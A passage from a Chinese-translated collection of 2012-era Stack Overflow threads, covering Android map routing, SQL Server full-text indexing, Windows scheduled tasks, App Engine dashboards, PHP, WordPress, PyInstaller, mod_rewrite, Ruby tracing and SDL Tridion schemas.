            double lattitude = loc.getLatitude();
            double longitude = loc.getLongitude();

            Toast.makeText(
                    MapRouteActivity.this,
                    "Longitude iss  " + lattitude + "   Latitude iss   "
                            + longitude, Toast.LENGTH_LONG).show();

        }
    }
    new Thread() {
        @Override
        public void run() {
            double fromLat = 49.85, fromLon = 24.016667, toLat = 50.45, toLon = 30.523333;
            String url = RoadProvider
                    .getUrl(fromLat, fromLon, toLat, toLon);
            InputStream is = getConnection(url);
            mRoad = RoadProvider.getRoute(is);
            mHandler.sendEmptyMessage(0);
        }
    }.start();

}

Handler mHandler = new Handler() {
    public void handleMessage(android.os.Message msg) {
        TextView textView = (TextView) findViewById(R.id.description);
        textView.setText(mRoad.mName + " " + mRoad.mDescription);
        MapOverlay mapOverlay = new MapOverlay(mRoad, mapView);
        List<Overlay> listOfOverlays = mapView.getOverlays();
        listOfOverlays.clear();
        listOfOverlays.add(mapOverlay);
        mapView.invalidate();
    };
};

private InputStream getConnection(String url) {
    InputStream is = null;
    try {
        URLConnection conn = new URL(url).openConnection();
        is = conn.getInputStream();
    } catch (MalformedURLException e) {
        e.printStackTrace();
    } catch (IOException e) {
        e.printStackTrace();
    }
    return is;
}

@Override
protected boolean isRouteDisplayed() {
    return false;
}

public static class GpsLocationListener implements LocationListener {
    private ImageView mCurrentPointer;

    public GpsLocationListener(Context context) {

    }

    public void onLocationChanged(Location loc) {

        if (loc != null) {

            double latitude = loc.getLatitude();
            double longitude = loc.getLongitude();
            GeoPoint point = new GeoPoint((int) (latitude * 1E6),
                    (int) (longitude * 1E6));
            Toast.makeText(
                    context,
                    "Longitude is  " + longitude + "   Latitude is   "
                            + latitude, Toast.LENGTH_LONG).show();
        }

    }

    @Override
    public void onProviderDisabled(String provider) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

}
}

class MapOverlay extends com.google.android.maps.Overlay {
Road mRoad;
ArrayList<GeoPoint> mPoints;

public MapOverlay(Road road, MapView mv) {
    mRoad = road;
    if (road.mRoute.length > 0) {
        mPoints = new ArrayList<GeoPoint>();
        for (int i = 0; i < road.mRoute.length; i++) {
            mPoints.add(new GeoPoint((int) (road.mRoute[i][1] * 1000000),
                    (int) (road.mRoute[i][0] * 1000000)));
        }
        int moveToLat = (mPoints.get(0).getLatitudeE6() + (mPoints.get(
                mPoints.size() - 1).getLatitudeE6() - mPoints.get(0)
                .getLatitudeE6()) / 2);
        int moveToLong = (mPoints.get(0).getLongitudeE6() + (mPoints.get(
                mPoints.size() - 1).getLongitudeE6() - mPoints.get(0)
                .getLongitudeE6()) / 2);
        GeoPoint moveTo = new GeoPoint(moveToLat, moveToLong);

        MapController mapController = mv.getController();
        mapController.animateTo(moveTo);
        mapController.setZoom(7);
    }
    }

@Override
public boolean draw(Canvas canvas, MapView mv, boolean shadow, long when) {
    super.draw(canvas, mv, shadow);
    drawPath(mv, canvas);
    return true;
}

public void drawPath(MapView mv, Canvas canvas) {
    int x1 = -1, y1 = -1, x2 = -1, y2 = -1;
    Paint paint = new Paint();
    paint.setColor(Color.GREEN);
    paint.setStyle(Paint.Style.STROKE);
    paint.setStrokeWidth(3);
    for (int i = 0; i < mPoints.size(); i++) {
        Point point = new Point();
        mv.getProjection().toPixels(mPoints.get(i), point);
        x2 = point.x;
        y2 = point.y;
        if (i > 0) {
            canvas.drawLine(x1, y1, x2, y2, paint);
        }
        x1 = x2;
        y1 = y2;
    }
}
} 
```

我想在上面的代码中将当前位置的纬度和经度值分配给 fromLat 和 fronLon 变量：

```
new Thread() {
        @Override
        public void run() {
            double fromLat = 49.85, fromLon = 24.016667, toLat = 50.45, toLon = 30.523333;
            String url = RoadProvider
                    .getUrl(fromLat, fromLon, toLat, toLon);
            InputStream is = getConnection(url);
            mRoad = RoadProvider.getRoute(is);
            mHandler.sendEmptyMessage(0);
        }
    }.start(); 
```

帮助 ！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T09:03:47.340

非常简单---

使您的活动像这样：--

```
 public class GoogleMapLocationActivity extends MapActivity {

 private LocationManager myLocationManager;
 private LocationListener myLocationListener;
 private TextView myLongitude, myLatitude;
 private MapView myMapView;
 private MapController myMapController;
 LinearLayout zoomLayout;
 GeoPoint myLastPosition;
 AddItemizedOverlay mapOvlay;

 private void CenterLocatio(GeoPoint centerGeoPoint)
 {
  myMapController.animateTo(centerGeoPoint);

  List<Overlay> mapOverlays = myMapView.getOverlays();
  Drawable drawable = this.getResources().getDrawable(R.drawable.map_point);

  if(myLastPosition != null){
  mapOvlay = new AddItemizedOverlay(myLastPosition ,centerGeoPoint,drawable );
  OverlayItem overlayitem = new OverlayItem(centerGeoPoint,"","" );
  mapOvlay.addOverlay(overlayitem);
  mapOverlays.add(mapOvlay);
  }
      myLastPosition = centerGeoPoint;

};

 /** Called when the activity is first created. */
 @Override
 public void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  setContentView(R.layout.main);
  myMapView = (MapView)findViewById(R.id.mapview);
         myLastPosition = null;
     myMapController = myMapView.getController();
     myMapController.setZoom(18); //Fixed Zoom Level

  myLocationManager = (LocationManager)getSystemService(
    Context.LOCATION_SERVICE);

  myLocationListener = new MyLocationListener();

  myLocationManager.requestLocationUpdates(
    LocationManager.GPS_PROVIDER,
    0,
    0,
    myLocationListener);

 private class MyLocationListener implements LocationListener{

      public void onLocationChanged(Location argLocation) {
        GeoPoint myGeoPoint = new GeoPoint(
        (int)(argLocation.getLatitude()*1000000),
         (int)(argLocation.getLongitude()*1000000));

     GeoPoint newGeoPoint = new  GeoPoint(myGeoPoint.getLatitudeE6() ,myGeoPoint.getLongitudeE6());
   CenterLocatio(newGeoPoint);
  }

  public void onProviderDisabled(String provider) {
      Toast.makeText(getBaseContext(),"GPS Disabled" ,Toast.LENGTH_SHORT).show();
  }

  public void onProviderEnabled(String provider) {
      Toast.makeText(getBaseContext(),"GPS Enabled" ,Toast.LENGTH_SHORT).show();
  }

  public void onStatusChanged(String provider,
    int status, Bundle extras) {
      Toast.makeText(getBaseContext(),"GPS Unavailable" ,Toast.LENGTH_SHORT).show();
  }
 }

 @Override
 protected boolean isRouteDisplayed() {
  return false;
 };

} 
```

AddItemizedOverlay.class-----

```
public class AddItemizedOverlay extends ItemizedOverlay<OverlayItem> {

       private ArrayList<OverlayItem> mapOverlays = new ArrayList<OverlayItem>();

       private Context context;
       private GeoPoint mGpt1;
       private GeoPoint mGpt2;

       public AddItemizedOverlay(GeoPoint gp1,GeoPoint gp2, Drawable defaultMarker) {

            super(boundCenterBottom(defaultMarker));
             mGpt1 = gp1;
             mGpt2 = gp2;
        }

       public AddItemizedOverlay(Drawable defaultMarker) {
            super(boundCenterBottom(defaultMarker));
       }

       public AddItemizedOverlay(Drawable defaultMarker, Context context) {
            this(defaultMarker);
            this.context = context;
       }

       @Override
       protected OverlayItem createItem(int i) {
          return mapOverlays.get(i);
       }

       @Override
       public int size() {
          return mapOverlays.size();
       }

       @Override
       protected boolean onTap(int index) {
          Log.e("Tap", "Tap Performed");
          return true;
       }

       public void addOverlay(OverlayItem overlay) {
          mapOverlays.add(overlay);
           this.populate();
       }

       public boolean draw(Canvas canvas, MapView mapView, boolean shadow,
                long when) {
             super.draw(canvas, mapView, shadow);
             Paint paint;
             paint = new Paint();
             paint.setColor(Color.RED);
             paint.setAntiAlias(true);
             paint.setStyle(Style.STROKE);
             paint.setStrokeWidth(2);
             Point pt1 = new Point();
             Point pt2 = new Point();
             Projection projection = mapView.getProjection();
             projection.toPixels(mGpt1, pt1);
             projection.toPixels(mGpt2, pt2);
             canvas.drawLine(pt1.x, pt1.y, pt2.x, pt2.y, paint);
             return true;
          }
    } 
```

希望它会帮助你...

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T07:00:23.707

使用以下，它将在本地地图应用程序上显示方向，

```
 final Intent intent = new Intent(Intent.ACTION_VIEW,
    Uri.parse(
            "http://maps.google.com/maps?" +
            "saddr="+YOUR_START_LONGITUDE+","+YOUR_START_LATITUDE+"&daddr="YOUR_END_LONGITUDE+","+YOUR_END_LATITUDE));
         intent.setClassName(
          "com.google.android.apps.maps",
          "com.google.android.maps.MapsActivity");
   startActivity(intent); 
```

# sql - 视图或表上的全文索引？

> ID：10069922
> 
> 赞同：1
> 
> 时间：2012-04-09T06:50:45.830
> 
> 标签：sql, sql-server-2008, fulltext-index

我们将对视图进行全文索引。但是在尝试在视图上创建聚集索引时，它会显示类似“ `Cannot create index. Object was created with the following SET options off: 'ANSI_NULLS'.`”的错误

所以参考this [SO post](https://stackoverflow.com/questions/10010042/update-ansi-nulls-option-in-an-existing-table)

避免这种情况的唯一选择是删除并重新创建表。

所以在这样做之前我问我是否可以为表本身做一个全文索引而不是在视图上创建一个索引。即从表中选择结果进行搜索，然后从视图中选择相应的数据。

与视图上的全文索引相比，在表上执行全文索引时是否存在任何与性能相关的问题。？请给出您的建议？

# c++ - 如何在不提示输入密码的情况下设置计划任务

> ID：10069925
> 
> 赞同：1
> 
> 时间：2012-04-09T06:51:12.177
> 
> 标签：c++, mfc, scheduled-tasks, shellexecute, windows-task-scheduler

我有一个需要在 Windows 中设置计划任务的应用程序。为此，我使用了 ShellExecute 函数来调用 schtasks.exe

我使用了以下代码：

```
ShellExecute(NULL, _T("open"), _T("schtasks.exe"), _T("/create /TN SampleSchedule /TR calc.exe /SC DAILY /ST 12:15:00 /SD 09/04/2012"),_T(""),0); 
```

但它还没有创建计划任务。

但是当我将 ShellExecute 函数的最后一个参数（显示命令提示符）更改为 1

```
ShellExecute(NULL, _T("open"), _T("schtasks.exe"), _T("/create /TN SampleSchedule /TR calc.exe /SC DAILY /ST 12:15:00 /SD 09/04/2012"),_T(""),1); 
```

显示命令提示符并询问当前登录用户的密码。

/RU SYSTEM 正在工作，但我想以当前登录用户身份运行，而不要求输入密码....

可能吗？如果是，我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-15T19:17:46.610

Use ITaskScheduler COM interface instead.

Examples of using it [here](http://msdn.microsoft.com/en-us/library/windows/desktop/aa446856%28v=vs.85%29.aspx) and [here](http://www.codeproject.com/Articles/13089/Harnessing-the-task-scheduler)

# google-app-engine - 如何访问我的 App Engine 应用每小时/每天/每周返回的错误数量？

> ID：10069927
> 
> 赞同：0
> 
> 时间：2012-04-09T06:51:25.787
> 
> 标签：google-app-engine, google-eclipse-plugin

以应用管理员身份登录时，我的 Google App Engine 应用是否可以调用 API，该 API 会返回有关我的应用返回的错误数（404、500 等）的信息？

我想在我的应用程序中设置一个简单的 cron 作业，以计算我的应用程序每隔几分钟返回的错误数，并在错误率变得异常高时向我发送电子邮件。我想避免不得不从 Appspot 仪表板中抓取信息或在我的应用程序之外运行另一个进程。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T08:51:45.800

最接近您需要的可能是[LogService API](https://developers.google.com/appengine/docs/python/logservice/functions)

请注意，它不适用于 Java 运行时（我假设）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-29T07:41:40.230

这仅适用于**云**，并且对 GAE 友好。

您将需要 jsoup。

```
package some.package

import java.util.HashMap;
import java.util.Map;

import org.jsoup.Connection;
import org.jsoup.Connection.Method;
import org.jsoup.Connection.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class AppEngineScraperUtil
{
    private static final Logger logger = LoggerFactory.getLogger( AppEngineScraperUtil.class );

    /**
     * @param appId
     *            in the form of {@code appId}
     * @return dashboard in html
     */
    public static String fetchDashboard( String appId )
    {
        return jsoupWay( appId );
    }

    private static String jsoupWay( String appId )
    {
        try
        {
            Connection conn = createGetConn( "https://appengine.google.com" );
            Response result = conn.execute();
            Document doc = result.parse();
            // parse inputs
            Elements elements = doc.select( "#dsh, [name=GALX], #service, #continue, #ltmpl" );
            Map<String, String> formFields = new HashMap<String, String>();
            // build form
            for ( Element element: elements )
                formFields.put( element.attr( "name" ), element.val() );
            formFields.put( "Email", "xxx" );
            formFields.put( "Passwd", "xxx" );
            String formAction = doc.select( "form" ).first().attr( "action" );
            // parse cookies
            Map<String, String> cookies = result.cookies();
            // build post
            conn = createPostConn( formAction );
            conn.cookies( cookies );
            conn.data( formFields );
            conn.header( "Content-Type", "application/x-www-form-urlencoded" );
            result = conn.execute();
            doc = result.parse();
            // get dashboard
            conn = createGetConn( "https://appengine.google.com/dashboard?&app_id=" + appId );
            conn.cookies( result.cookies() );
            result = conn.execute();
            // return html
            doc = result.parse();
            return doc.toString();
        }
        catch ( Exception e )
        {
            logger.error( "Error retrieving dashboard.", e );
        }
        return null;
    }

    private static Connection createPostConn( String url )
    {
        Connection conn = Jsoup.connect( url );
        conn.method( Method.POST );
        return conn;
    }

    private static Connection createGetConn( String url )
    {
        Connection conn = Jsoup.connect( url );
        conn.method( Method.GET );
        return conn;
    }
} 
```

# php - 使用索引列表删除数组中的元素

> ID：10069933
> 
> 赞同：1
> 
> 时间：2012-04-09T06:52:21.020
> 
> 标签：php, arrays

我有一个数字索引的字符串数组。另一个数组包含第一个数组的一组索引。如果第一个数组元素的索引在第二个数组中，我想删除第一个数组中的所有元素。我怎样才能在php中做到这一点？它有什么功能吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T06:56:37.030

```
$strings = array('foo', 'bar', 'baz');
$indexes = array(1, 2);
$strings = array_diff_key($strings, array_flip($indexes)); 
```

# php - 在 wordpress 中为图像生成嵌入代码

> ID：10069934
> 
> 赞同：0
> 
> 时间：2012-04-09T06:52:25.487
> 
> 标签：php, javascript, wordpress

我有一个 wordpress 网站，我们倾向于在我们的帖子中使用很多图片。现在这些图像充满了统计数据，人们倾向于复制它以供参考。现在，我们想要的是让用户为这些图像自动生成嵌入代码。

我们为此目的找到了类似的东西 -[为 wordpress 嵌入任何插件](http://www.embedanything.com/image-how-it-works)。但是，由于某种原因，该插件似乎已损坏，并且无法与嵌入的图像一起正常工作。是的，我已经正确使用了发布者的 ID。

有人可以找出这个插件有什么问题吗？或者，有人可以建议任何生成类似于头像托管站点的嵌入代码的脚本或代码吗？这样我就可以在wordpress中集成相同的内容。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-07T01:26:30.143

这可以使用简码来完成：

```
/*
 * Usage: 
 * [embedimage img="http://domain.com/wp-content/uploads/image.png" title="The image title"]
 * or without a permalink wrapping the image: 
 * [embedimage img="http://domain.com/wp-content/uploads/image.png" title="The image title" nolink=""]
 */
add_shortcode('embedimage', 'so_10069934_embed_image');
function so_10069934_embed_image($atts, $content = null) {
    global $post;
    $link_init = (isset($atts['nolink'])) ? '' : '<a href="'.get_permalink($post->ID).'" target="_blank">';
    $link_end = (isset($atts['nolink'])) ? '' : '</a>';
    $html = <<<HTML
    <script type="text/javascript">
        function copyToClipboard (text) {
          window.prompt ("Copy to clipboard: Ctrl+C, Enter", text);
              return false;
        }
    </script>
    <a href="javascript:void(0)" id="copy" onclick="copyToClipboard(document.getElementById('pre').innerHTML);">Copy to clipboard</a>
    <pre id="pre" style="display:none">{$link_init}<img src="{$atts['img']}" alt="{$atts['title']}" border="0" />{$link_end}</pre>
HTML;
    return $html;
} 
```

将一些文本复制到剪贴板的 Javascript 解决方案来自这里： [https ://stackoverflow.com/a/6055620/1287812](https://stackoverflow.com/a/6055620/1287812)

该函数`copyToClipboard`最好位于主题的 Javascript 文件中。

不过，如果有一个在stackoverflow 中用于共享链接的漂亮小对话框会很好:) 但是，我想这并不难，只是CSS 样式和一些jQuery 的问题。

# android - 如何在文件级别重新启用禁用的 Android Lint 警告

> ID：10069936
> 
> 赞同：8
> 
> 时间：2012-04-09T06:52:29.933
> 
> 标签：android, file, warnings, android-lint

我为特定的 XML 文件禁用了 Android Lint 警告“HardcodedText”（它适用于带有数字修复文本的数字键盘）。

*在Windows > Preferences > Android > Lint Error Checking*和*Project > Properties > Android Lint Preferences*中，我都找不到在此文件上重新启用它的方法（“恢复默认值”左右）。

关于如何在文件级别重新启用禁用警告的任何想法？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-05-03T15:35:10.820

我自己发现了：Lint 将文件“lint.xml”与依赖项一起放入项目中。

```
<lint>
  <issue id="UnusedResources">
    <ignore path="res\layout\my_layout.xml" />
  </issue>
<lint> 
```

不幸的是，编辑和保存这个文件是不够的。您必须关闭并重新打开项目甚至 Eclipse。

HTH 其他人有同样的问题....

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-08T04:19:56.007

如果您只有一个文件并且需要重新启用 lint 警告，请转到 Windows -> Preferences -> Android -> Lint Error Checking -> Restore Defaults

# android - 访问 Android 的字典以进行自动完成

> ID：10069938
> 
> 赞同：7
> 
> 时间：2012-04-09T06:52:38.900
> 
> 标签：android

我想在 Android 中创建一个自动完成功能，并希望它从设备上现有的语言词典中查找单词。

Android 设备上有哪些词典？（可能有几种语言，还有一些用户词典？）如何访问 Android 现有的词典？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-01-11T11:23:16.317

虽然**没有 API 可以访问任何预加载的语言词典**，IME 自带语言词典，**系统不提供任何词典数据**。

有一个[UserDictionary](https://developer.android.com/reference/android/provider/UserDictionary.html)内容提供程序

> **注意**：从 API 23 开始，用户字典只能通过 IME 和拼写检查器访问。

不幸的是，您必须创建一个 IME 或拼写检查器才能访问用户字典。

# javascript - jstree 检查父节点

> ID：10069941
> 
> 赞同：2
> 
> 时间：2012-04-09T06:52:49.180
> 
> 标签：javascript, jquery, html, css, jstree

我创建了一个两个状态的jstree。由于我需要制作一个两状态树，因此我无法选择相对于节点的任何其他节点。我想要的是，当我单击特定节点时，还应检查所选节点的所有父节点。

请帮我 ..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T23:21:11.223

绑定到处理程序并传入节点对象。可以向上遍历树以找到所有父节点。下面的示例使用类“jstree-open”，但应用于父级的任何其他类也可以使用。

```
$(node).parents(".jstree-open").each(function(index){
     var theParent=$(this);
     // Apply operation to each parent
}); 
```

# java - 如何验证给定的电子邮件地址是否属于公司公司？

> ID：10069943
> 
> 赞同：-1
> 
> 时间：2012-04-09T06:53:07.137
> 
> 标签：java

当用户输入他/她的邮件地址时，如何验证输入的电子邮件地址属于公司公司。

要求是不接受 gmail 或 yahoo 等公共电子邮件，并且只接受 CORPORATE(xyx@companyname.com) 的电子邮件 ID

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T06:56:56.710

您必须保留一份您将所有公司视为公司的手动列表，我认为要求是不要接受像 gmail 或 yahoo 这样的公共电子邮件，所以您可以保留两个列表，一个用于支持，一个用于未支持并保留他们维护:)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T07:07:47.983

您可以使用两步电子邮件验证。首先获取用户邮件并发送电子邮件确认电子邮件，如果您的第二封电子邮件发送正确并且用户回复它，您就知道用户电子邮件是有效的。有许多网站使用这种方法来激活帐户和验证电子邮件。

同样在上面的建议中，您最好通过 验证输入电子邮件的模式`Regular Expression`。

以下网址可能会对您有所帮助：

*   [http://www.emailanswers.com/services/email-list-cleaning/](http://www.emailanswers.com/services/email-list-cleaning/)
*   [http://www.massmailsoftware.com/verify/](http://www.massmailsoftware.com/verify/)

希望我的回答对你有用。

# c++ - Exe 不能在旧版本的 Windows 上运行

> ID：10069945
> 
> 赞同：3
> 
> 时间：2012-04-09T06:53:44.910
> 
> 标签：c++, c, windows, winapi

我有一个 Win32 C++ 应用程序，我在 Microsoft Visual Studio C++ express 2010 中运行 Windows 7 的 PC 上编译。该应用程序是在发布模式下使用 \MT 运行时标志（多线程）编译的。

**我的问题：**当我尝试在运行 Windows Vista 的笔记本电脑上运行我的 .exe 时，应用程序崩溃并且永远不会打开主窗口。我使用的 .exe 是 Visual Studio 项目的“发布”文件夹的输出。

我已经检查了应用程序中的大多数 win32 功能，它们都可以在 Windows 2000 及更高版本上运行。我还将 Visual Studio 项目移到 Windows Vista 笔记本电脑上并对其进行了编译，它运行良好且工作正常。

为什么.exe会崩溃？这是否意味着我可以让我的 .exe 在不同版本的 Windows 操作系统上工作的唯一方法是使用安装程序？.exe 的大小只有 175kb，所以安装程序可能会比输出的 .exe 大，哈哈？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:13:24.020

听起来您需要[VS2010 运行时可重新分发](http://www.microsoft.com/download/en/details.aspx?id=8328)包。请注意，该链接适用于 VS2010 SP1，如果您尚未使用 SP1 编译，则可能需要没有 SP1 的 VS2010。

# asp.net - EF Code First（现有数据库）将单个实体与两个表相关联

> ID：10069946
> 
> 赞同：-1
> 
> 时间：2012-04-09T06:53:51.367
> 
> 标签：asp.net, asp.net-mvc-3, entity-framework-4

> **可能重复：**
> [如何将单个实体映射到多个表](https://stackoverflow.com/questions/10070664/how-map-single-entity-with-multiple-table)

我想从两个表中获取数据并将其存储到一个实体中。如何？？

实体类：

```
 public class HomeViewModel
{
    [Key]
    [Column("candidate_ID")]
    public int candidateID { get; set; }
    [Column("first_name")]
    public string firstName { get; set; }
    [Column("last_name")]
    public string lastName { get; set; }

   // [Column("")]
    public string emailID { get; set; }
   // [Column("")]
    public string mb_country_code { get; set; }
    //[Column("")]
    public int mobile_no { get; set; }
} 
```

上面的实体类包含 6 个属性，其中 3 个属性代表 ont table1，3 个代表 table2。
在数据库中，表 1 将候选 ID 作为主键，表 2 将候选 ID 作为外键。

# android - 动画图像将其带出对话框

> ID：10069952
> 
> 赞同：1
> 
> 时间：2012-04-09T06:54:25.563
> 
> 标签：android, android-animation

我正在尝试制作一个图像（位于活动中的对话框内）从对话框内飞到主要活动的右下角（将图像带出对话框）。但我只能做到飞到对话框的右下角。图像未从对话框中出来。这是我的xml代码。请帮我。

```
<?xml version="1.0" encoding="utf-8"?>
<set xmlns:android="http://schemas.android.com/apk/res/android android:shareInterpolator="false">
<scale 
    android:fromXScale="8.0" android:fromYScale="8.0"
    android:toXScale="1.0" android:toYScale="1.0"
    android:pivotX="50%" android:pivotY="50%" 
    android:duration="1000" />
<alpha android:fromAlpha="1.0" android:toAlpha="0.0"
    android:startOffset="500" 
    android:duration="500" />
<rotate android:fromDegrees="0" android:toDegrees="180"
    android:pivotX="50%" android:pivotY="50%" 
    android:duration="1000" 
    android:interpolator="@android:anim/anticipate_overshoot_interpolator"/>
<translate android:fromXDelta="0"
    android:toXDelta="50%"
    android:fromYDelta="0"
    android:toYDelta="50%"
    android:fillAfter="true"
    android:duration="1000" />

</set> 
```

# iphone - 设置 UILocal 通知声音设置大尺寸音乐文件

> ID：10069956
> 
> 赞同：0
> 
> 时间：2012-04-09T06:55:04.283
> 
> 标签：iphone, objective-c, ipad

我正在开发警报应用程序，我想在`UILocalnotification`声音名称中设置大声音文件，但不知何故它不会播放持续时间超过 30 秒的文件。

那么我现在能做什么可以有其他解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T07:24:31.507

的财产[文件](http://developer.apple.com/library/ios/#DOCUMENTATION/iPhone/Reference/UILocalNotification_Class/Reference/Reference.html)说：`soundName``UILocalNotification`

> 不支持持续时间超过 30 秒的声音。如果您指定的文件的声音播放时间超过 30 秒，则会播放默认声音。

不幸的是，我认为您不会找到一种解决方法，可以让您播放更长的声音文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T09:55:32.907

UILocal Notifications 只允许声音播放 30 秒。

# python - 使用 PyInstaller 将 pyOpenSSL 打包成 windows 可执行文件

> ID：10069959
> 
> 赞同：2
> 
> 时间：2012-04-09T06:55:14.553
> 
> 标签：python, pyinstaller, pyopenssl

我正在尝试将 pyOpenSSL 包包含到虚拟环境中的可执行文件中。可执行文件构建时没有错误，但是当我运行它时失败并出现错误“DLL 加载失败：找不到指定的模块”。

经过调查，pyOpenSSL 中的两个 DLL（libeay32.dll 和 ssleay32.dll）似乎未包含在可执行文件中。我最终通过将 DLL 放在路径上并运行可执行文件来证明这一点。

任何人都可以建议最简单的方法来强制将丢失的 DLL 包含到包中。

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-17T18:56:57.617

听起来您需要在规范文件中手动指定 DLL。查看[关于 TOC 类的文档，](http://www.pyinstaller.org/export/d3398dd79b68901ae1edd761f3fe0f4ff19cfb1a/project/doc/Manual.html?format=raw#toc-class-table-of-contents)了解有关规范文件中有效数据类型的更多信息。似乎您想使用`BINARY`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-03T15:51:22.723

我刚刚从 pyOpenSSL v.0.13（它有一个适用于 Windows 的 msi 安装程序）升级到 v.0.15（我通过 Python v.2.7.9 的“pip”安装）。在此之前，pyInstaller 工作正常。在此之后，pyInstaller 无法生成工作包。结果证明缺少一个依赖项。但是，它不是 dll，而是 pyd。

只需将文件 C:\Python27\Lib\site-packages\_cffi_backend.pyd 复制到与 pyInstaller 创建的 exe 相同的目录即可解决问题。

# apache - 需要帮助形成 mod_rewrite 规则

> ID：10069965
> 
> 赞同：1
> 
> 时间：2012-04-09T06:55:50.260
> 
> 标签：apache, mod-rewrite

好的，在我的网站上，我希望它是这样，当人们访问[http://mysite.com/201209041](http://mysite.com/201209041)时，它将重定向到 http://mysite.com/[前 4 位数字]/[接下来的两位数字]/[接下来的两位数字]/[所有其他数字]/index.html 所以在我的例子中它会重定向到[http://mysite.com/2012/09/04/1/index.html](http://mysite.com/2012/09/04/1/index.html) 而在另一个例子中是 [http://mysite.com/ 20120904259872](http://mysite.com/20120904259872) 将重定向到 [http://mysite.com/2012/09/04/259871/index.html](http://mysite.com/2012/09/04/259871/index.html)

我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T12:49:27.627

当然，您可以像这样拆分网址：

```
RewriteRule ^(\d{4})(\d{2})(\d{2})(\d*)$ /$1/$2/$3/$4/index.html [L,R] 
```

在我看来，PHP 方法将是更好的选择。

# ruby - 如何检测红宝石中的变量更改/分配

> ID：10069967
> 
> 赞同：2
> 
> 时间：2012-04-09T06:56:02.723
> 
> 标签：ruby

我正在尝试用 ruby​​ 编写调试器。每次变量更改时，我都想运行一些代码。我事先不知道变量。

目前我正在尝试 set_trace_func 但它似乎在每一行之前执行，而不是在每一行之后执行，例如；

```
set_trace_func proc { |event, file, line, id, binding, classname|
    if file == "(eval)"
        printf "%8s %s:%-2d %10s %8s\n", event, file, line, id, classname
        args = binding.eval("local_variables").inject({}) do |vars, name|
            value = binding.eval name.to_s
            vars[name] = value unless vars.nil?

            vars
        end
        puts args.inspect
    end
}

eval("blah = 4\nrar = 3\n")

set_trace_func(nil) 
```

当我执行它时，我得到；

```
n@VirtualBox:~$ ruby blah.rb 
    line (eval):1                     
{:blah=>nil, :rar=>nil}
    line (eval):2                     
{:blah=>4, :rar=>nil}
n@VirtualBox:~$ 
```

这不是我想要的 - 它没有显示对 rar 的分配。有一个更好的方法吗？作为 hack，我在 eval 中添加了最后一条语句，例如。

```
eval("blah = 4\nrar = 3\nnil\n") 
```

但这并不能解决循环等问题。

我想得到一个变量在哪一行更改的输出以及它按顺序更改的内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T13:32:50.777

我不知道纯 ruby​​ 中的机制可以帮助您编写调试器和挂钩低级执行功能，例如变量赋值。ruby-debug 是一个 C 扩展，具有深厚的知识并与执行引擎挂钩。你可以[在这里阅读](https://github.com/mark-moseley/ruby-debug/tree/master/ext/ruby_debug)。

# tridion - 使用核心服务在 SDL Tridion 2011 SP1 中创建具有字段约束的架构

> ID：10069980
> 
> 赞同：2
> 
> 时间：2012-04-09T06:57:30.333
> 
> 标签：tridion

我正在使用 SDL Tridion 2011 SP1 中的 Core Service 2011 创建架构。

我只是想知道是否可以使用核心服务创建自定义数据类型（或者实际上是模式字段内容的验证器）。

例如：我想创建一个包含以下详细信息的 Schema 字段：

*   姓名：`bodyparagraphtext`
*   类型：`text`长度为 10 个字符

任何人都可以分享一些想法吗？

谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T07:20:28.643

查看 Live Documentation Portal，位于发布`SDL Tridion 2011 SP1`部分`Implementing Content Manager features / Schemas / Constraining field content`（[此处](http://sdllivecontent.sdl.com/LiveContent/web/pub.xql?action=home&pub=SDL_Tridion_2011_SPONE&lang=en-US#url=http://sdllivecontent.sdl.com:80/LiveContent/web/search.xql?c=t&pub=SDL_Tridion_2011_SPONE&lang=en-US&action=search&query=schema%2520constraints&sid=lcSearch.runSearch1333955571156&eventType=lcContent.loadDocconcept_A0CA4F22FF3E4D2AA8D2320B7F30465B&query=&scope=&filename=Schema_ConstrainingFieldContent.xml&docid=concept_A0CA4F22FF3E4D2AA8D2320B7F30465B&inner_id=&tid=&addHistory=true&resource=)链接）。

我认为您正在寻找的是`minLength`/ `maxLength`facets 甚至是正则表达式`pattern`。

使用 Core Service 创建 Schema 时，您需要做的就是将这些 XML 节点插入到 Schema`Content`节点中。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-09T17:24:40.737

Tridion 自己的模式实现使用[XSD appinfo 注释](http://www.w3.org/TR/xmlschema-1/#cAnnotations)在基本数据类型上分层更丰富的功能。例如，以这种方式控制不同的用户界面选项。原则上，这不是 Xml Schema*验证*的一部分，但您可以添加自己的注释来控制自己的验证代码，例如在事件系统和 GUI 扩展中。

我刚刚检查过，如果您添加自己的注释，Tridion 将正确存储它们。添加此类注释似乎不会阻止架构被视为 Tridion Web 架构（具有完整的用户界面支持），这很好，否则您必须自己构建所有内容。Tridion 对其注解数据使用自己的命名空间，因此如果您将自己的注解放入自己的命名空间中，应该不会造成混淆。

